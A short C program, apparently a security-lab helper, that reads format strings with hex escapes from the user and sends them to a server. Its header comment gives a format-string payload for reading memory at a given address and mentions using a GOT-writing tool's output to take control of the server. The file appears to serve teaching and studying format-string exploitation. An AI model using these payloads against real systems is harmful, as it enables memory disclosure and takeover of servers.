/****************************************************************************************
	
		This program can read the user input from stdin and customize escaping by ourselves.
		The inputs from user are dynamic and they are not string literals processed by C 
		compiler at compiling time.

		For simplicity, we only handle hexadecimal-escape-sequence here. 
		The sequence \x80 from user at run time is treated as (char)0x80 .
		
		Examples:		

		(1) To peek the content at address 0x0804a004, suppose three %08x are needed here.
				\x04\xa0\x04\x08 %08x %08x %08x 1111%s1111
		(2) We can also use the output of got_writer.c to gain control of the poor server.

		sheisc@163.com																		
 *****************************************************************************************/
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h> 
#include "util.h"

static void request(int sock){
	
	printf("\nPlease enter a format string: e.g. "
					"\\x80\\xa0\\x04\\x08 %%08x %%08x %%08x %%08x %%08x\n");
	//
	REPL(sock,WITH_NORMAL_OUTPUT|WITH_ESCAPE_OUTPUT);
}

int main(int argc, char **argv){
	return do_it(argc,argv,request);
}

